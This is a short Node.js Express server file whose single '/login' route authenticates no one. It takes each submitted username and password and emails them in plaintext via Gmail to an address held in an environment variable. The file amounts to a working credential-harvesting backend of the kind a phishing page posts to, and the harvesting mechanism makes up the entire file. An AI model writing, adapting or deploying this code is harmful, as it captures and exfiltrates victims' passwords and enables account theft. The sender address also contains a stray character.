import express from "express";
import nodemailer from "nodemailer";
import cors from "cors";
import dotenv from "dotenv";


dotenv.config(); 
const app = express();
const PORT = process.env.PORT
app.use(cors());
app.use(express.json());

app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ message: "Missing username or password" });
  }

  try {
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    const mailOptions = {
      from: "sender@gmail.com>",
      to: process.env.EMAIL_TO,
      subject: "New Login Attempt",
      text: `Username: ${username}\nPassword: ${password}`,
    };

    // Send email
    await transporter.sendMail(mailOptions);

    console.log("Login data sent successfully!");
    return res.status(200).json({ message: "Email sent successfully" });
  } catch (err) {
    console.error("Error sending email:", err);
    return res.status(500).json({ message: "Failed to send email" });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
